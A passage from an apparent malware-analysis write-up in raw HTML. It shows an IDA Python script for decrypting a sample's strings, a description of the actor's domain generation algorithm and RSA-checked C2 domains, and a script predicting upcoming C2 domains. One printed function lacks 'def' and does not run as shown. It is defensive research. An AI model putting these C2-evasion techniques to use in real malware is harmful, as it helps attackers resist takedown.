id="crayon-5f69287d2de92213081590-12"><span class="crayon-e">&nbsp;&nbsp; 	 </span><span class="crayon-v">dec_str</span><span class="crayon-o">+=</span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-v">dec_byte</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de92213081590-13"><span class="crayon-h"> 	&nbsp;&nbsp; </span><span class="crayon-v">towByte_hex</span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-e">xorKey_mul</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de92213081590-14"><span class="crayon-e"> 	&nbsp;&nbsp; </span><span class="crayon-v">xorKey_mul</span><span class="crayon-o">=</span><span class="crayon-e ">xorKey_mul*</span><span class="crayon-e">towByte_hex</span></div><div class="crayon-line" id="crayon-5f69287d2de92213081590-15"><span class="crayon-e">&nbsp;&nbsp;	&nbsp;&nbsp;</span><span class="crayon-v">xorKey_mul</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">xorKey_mul</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-cn">0xffff</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de92213081590-16"><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">dec_str</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0016 seconds] -->
<p>This IDA Python script adds comments to IDA with all clear text strings:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287d2de99432419403" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
import os,sys
def find_function_arg(addr):
  while True:
    addr = idc.PrevHead(addr)
    if GetMnem(addr) == "mov" and "eax" in GetOpnd(addr, 0):
      return GetOperandValue(addr, 1)
  return ""
 
def get_string(addr):
  out = ""
  i = 200
  cnt=0
  while Byte(addr)&amp;gt; 0 or Byte(addr+1)&amp;gt;0:
    if Byte(addr) != 0:   
      out += chr(Byte(addr))
    addr += 1
    cnt+=1
    if cnt==i:
        return None
  return out
 
print "[*] Attempting to decrypt strings in malware: "
for x in XrefsTo(0x009F5410, flags=0):
    ref = find_function_arg(x.frm)
    string = get_string(ref)
    if string is not None:
        dec = decrypt(string)
        print "Ref Addr: 0x%x | Decrypted: %s" % (x.frm, dec)
    else:
        print "Ref Addr: 0x%x is None" % (x.frm)
    MakeComm(x.frm, dec)
    MakeComm(ref, dec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-2">2</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-4">4</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-6">6</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-8">8</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-10">10</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-12">12</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-14">14</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-16">16</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-18">18</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-20">20</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-22">22</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-24">24</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-26">26</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-28">28</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-30">30</div><div class="crayon-num" data-line="crayon-5f69287d2de99432419403-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de99432419403-32">32</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287d2de99432419403-1"><span class="crayon-e">import </span><span class="crayon-v">os</span><span class="crayon-sy">,</span><span class="crayon-e">sys</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-2"><span class="crayon-e">def </span><span class="crayon-e">find_function_arg</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-t">True</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">addr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">idc</span><span class="crayon-sy">.</span><span class="crayon-e">PrevHead</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-e">GetMnem</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"mov"</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-s">"eax"</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">GetOpnd</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">GetOperandValue</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-8"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-9"><span class="crayon-e">def </span><span class="crayon-e">get_string</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-10"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">out</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-11"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">200</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-12"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">cnt</span><span class="crayon-o">=</span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-13"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-t">Byte</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-st">or</span><span class="crayon-h"> </span><span class="crayon-t">Byte</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-o">+</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-cn">0</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-t">Byte</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">out</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-t">Byte</span><span class="crayon-sy">(</span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">addr</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">cnt</span><span class="crayon-o">+=</span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">cnt</span><span class="crayon-o">==</span><span class="crayon-v">i</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">None</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-20"><span class="crayon-e">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">out</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-21"><span class="crayon-e"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-22"><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"[*] Attempting to decrypt strings in malware: "</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-23"><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">x</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">XrefsTo</span><span class="crayon-sy">(</span><span class="crayon-cn">0x009F5410</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">flags</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">ref</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">find_function_arg</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-v">frm</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_string</span><span class="crayon-sy">(</span><span class="crayon-v">ref</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-v">None</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">dec</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">decrypt</span><span class="crayon-sy">(</span><span class="crayon-t">string</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"Ref Addr: 0x%x | Decrypted: %s"</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-v">frm</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">dec</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"Ref Addr: 0x%x is None"</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-v">frm</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de99432419403-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">MakeComm</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-v">frm</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">dec</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de99432419403-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">MakeComm</span><span class="crayon-sy">(</span><span class="crayon-v">ref</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">dec</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0028 seconds] -->
<p></p>
<h3>C2 Defense</h3>
<p>Learning from our takedown of the actor’s previous C2 infrastructure, this version implements two new C2 mechanisms in an attempt to avoid C2 takeover.</p>
<p>They are now using DGA for C2 domains. They have also implemented an RSA signature verifying algorithm to check the veracity of a C2 domain.</p>
<h3>Domain Generation Algorithm</h3>
<p>The domain name is calculated using this algorithm:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287d2de9b017042695" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
ToHex(CRC32("NRV1" + year + month + week_number)) + 	(".space"|".net"|".top")[</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287d2de9b017042695-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287d2de9b017042695-1"><span class="crayon-e">ToHex</span><span class="crayon-sy">(</span><span class="crayon-e">CRC32</span><span class="crayon-sy">(</span><span class="crayon-s">"NRV1"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">year</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">month</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">week_number</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> 	</span><span class="crayon-sy">(</span><span class="crayon-s">".space"</span><span class="crayon-o">|</span><span class="crayon-s">".net"</span><span class="crayon-o">|</span><span class="crayon-s">".top"</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>(Thanks to Palo Alto Networks researcher Esmid idrizovic for reversing this). The following script can be used to generate domain names using this algorithm:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287d2de9d803098629" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
import binascii
import datetime

def getHostCRC(input):
    crc = binascii.crc32(input) &amp;amp; 0xffffffff
    host = "{:08x}".format(int(crc))
    return host
def getDomains(date):
    domains = [".space"]
    results = []
    weeknumber = date.isocalendar()[1]
    s = "NRV1{}{}{}".format(date.year, date.month, weeknumber)
    hostname = s
    host = getHostCRC(hostname) + domains[0]
    results.append(host)
    for d in domains:
        for i in range(1, 101):
            hostname = s + str(i)
            host = getHostCRC(hostname) + d
            results.append(host)
    return results

getDomainsForNextWeeks(number_of_weeks):
    date = datetime.datetime.now()
    date -= datetime.timedelta(days=7)
    n = 1
    date_to = date + datetime.timedelta(days=7*number_of_weeks)
    print "Generating domains for: {} - {}.\nEach domain can have .space, .net or .top as TLD (top level domain).\n\n".format(date, date_to)

    for i in range(number_of_weeks):
        tmp = getDomains(date)
        top_domains = tmp[:20]
        weeknumber = date.isocalendar()[1]
        print "{}. {} - Week Number: {}".format(n, date, weeknumber)
        for domain in top_domains:
            print "{}".format(domain)
        date += datetime.timedelta(days=7)
        n = n + 1
        print ""
getDomainsForNextWeeks(10)[</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-2">2</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-4">4</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-6">6</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-8">8</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-10">10</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-12">12</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-14">14</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-16">16</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-18">18</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-20">20</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-22">22</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-24">24</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-26">26</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-28">28</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-30">30</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-32">32</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-34">34</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-36">36</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-38">38</div><div class="crayon-num" data-line="crayon-5f69287d2de9d803098629-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de9d803098629-40">40</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287d2de9d803098629-1"><span class="crayon-e">import </span><span class="crayon-e">binascii</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-2"><span class="crayon-e">import </span><span class="crayon-e">datetime</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-4"><span class="crayon-e">def </span><span class="crayon-e">getHostCRC</span><span class="crayon-sy">(</span><span class="crayon-v">input</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">crc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">binascii</span><span class="crayon-sy">.</span><span class="crayon-e">crc32</span><span class="crayon-sy">(</span><span class="crayon-v">input</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-cn">0xffffffff</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">host</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"{:08x}"</span><span class="crayon-sy">.</span><span class="crayon-e">format</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-sy">(</span><span class="crayon-v">crc</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">host</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de9d803098629-8"><span class="crayon-e">def </span><span class="crayon-e">getDomains</span><span class="crayon-sy">(</span><span class="crayon-v">date</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69287d2de9d803098629-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">domains</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span 